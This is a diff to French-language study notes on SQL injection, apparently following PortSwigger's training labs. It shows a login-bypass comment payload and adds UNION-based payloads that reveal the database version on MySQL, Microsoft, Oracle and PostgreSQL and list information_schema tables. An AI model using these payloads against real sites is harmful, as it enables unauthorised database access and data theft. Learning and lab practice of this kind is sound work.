@@ -29,10 +29,18 @@ SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 
 ## Examiner la base de données
 
+## Afficher la version
+
 ```
 MySQL, Microsoft : '+UNION+SELECT+@@version--
 Oracle : '+UNION+SELECT+banner+FROM+v$version--
 PostgreSQL : '+UNION+SELECT+version()--
+```
+
+## Afficher la table "information_schema"
+
+```
+'+UNION+SELECT+*+FROM+information_schema.tables--
 ```
 
 Cheat Sheet dispo ici pour les BDD spécifiques : https://portswigger.net/web-security/sql-injection/cheat-sheet
